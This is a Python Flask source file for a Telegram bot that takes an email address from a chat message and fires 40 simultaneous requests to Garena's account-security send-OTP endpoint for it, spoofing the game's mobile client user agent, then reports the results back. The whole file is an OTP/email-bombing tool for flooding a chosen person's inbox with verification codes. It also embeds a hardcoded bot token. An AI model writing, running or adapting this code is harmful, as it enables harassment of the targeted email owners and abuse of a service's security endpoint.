import requests
import threading
from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = "8658580899:AAGklJayHDFNGVlSRmRr6oC8J6i_YwLRcKA"
GARENA_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"

headers = {
    'User-Agent': 'GarenaMSDK/4.0.41(SM-A065F ;Android 15;ar;MA;app 1.123.1 2019120270;)',
    'Connection': 'Keep-Alive',
    'Accept': 'application/json',
    'Accept-Encoding': 'gzip'
}

def send_request(email, req_id, results, lock):
    try:
        payload = {'app_id': "100067", 'email': email, 'locale': "ar_MA"}
        response = requests.post(GARENA_URL, data=payload, headers=headers, timeout=10)
        result = f"[{req_id}] {response.text}"
    except Exception:
        result = f"[{req_id}] خطأ"
    with lock:
        results.append(result)

def send_telegram(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        for i in range(0, len(text), 4000):
            requests.post(url, json={"chat_id": chat_id, "text": text[i:i+4000]}, timeout=5)
    except:
        pass

@app.route("/", methods=["GET"])
def home():
    return "Bot is running", 200

@app.route("/webhook/" + BOT_TOKEN, methods=["POST"])
def webhook():
    try:
        update = request.get_json(silent=True)
        if not update or "message" not in update:
            return jsonify({"status": "ok"}), 200

        chat_id = update["message"].get("chat", {}).get("id")
        email = update["message"].get("text", "").strip()

        if not chat_id:
            return jsonify({"status": "ok"}), 200

        if "@" in email and "." in email:
            send_telegram(chat_id, f"جاري ارسال 40 طلب الى {email}...")

            results = []
            lock = threading.Lock()
            threads = []

            for i in range(1, 41):
                t = threading.Thread(target=send_request, args=(email, i, results, lock))
                threads.append(t)

            for t in threads:
                t.start()

            for t in threads:
                t.join()

            results.sort(key=lambda x: int(x.split("]")[0].replace("[", "")))
            send_telegram(chat_id, "النتائج:\n\n" + "\n".join(results))

        return jsonify({"status": "ok"}), 200
    except Exception:
        return jsonify({"status": "ok"}), 200

handler = app

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
